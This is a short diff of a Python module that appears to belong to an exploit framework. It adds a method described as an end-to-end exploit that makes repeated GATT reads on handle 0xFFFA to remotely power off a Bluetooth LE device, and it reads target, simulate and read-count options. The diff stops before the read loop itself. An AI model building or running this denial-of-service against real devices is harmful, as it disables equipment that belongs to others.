@@ -130,6 +130,11 @@ class Exploit(Exploit):
         if not self._validate():
             return
 
+        print_success("Validation passed, launching exploit...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: repeated GATT reads on 0xFFFA to trigger remote power-off."""
         simulate = bool(self.simulate)
         target_addr = str(self.target).strip()
         read_count = int(self.read_count)
